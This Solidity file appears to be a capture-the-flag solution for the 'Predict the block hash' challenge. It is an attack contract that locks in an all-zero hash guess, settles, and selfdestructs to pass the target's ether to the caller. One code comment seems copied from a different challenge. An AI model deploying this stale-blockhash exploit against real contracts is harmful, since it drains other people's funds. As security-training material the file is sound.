// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "./PredictTheBlockhash.sol";

contract Attack {
    PredictTheBlockHashChallenge private target;

    constructor(address _address) {
        target = PredictTheBlockHashChallenge(_address);
    }

    function lookInGuess() public payable {
        require(msg.value == 1 ether);
        bytes32 hash = 0x0000000000000000000000000000000000000000000000000000000000000000;

        // as ans % 10 so the value can be b/w 0-9
        target.lockInGuess.value(1 ether)(hash);
    }


    function hack() external payable {

        target.settle();
        require(target.isComplete(), "Not yet completed!!");
        
        // transfer all the remaining funds to the attacker
		selfdestruct(msg.sender);
    }

    //get the ether using fallback fn.
	function() public payable {}
}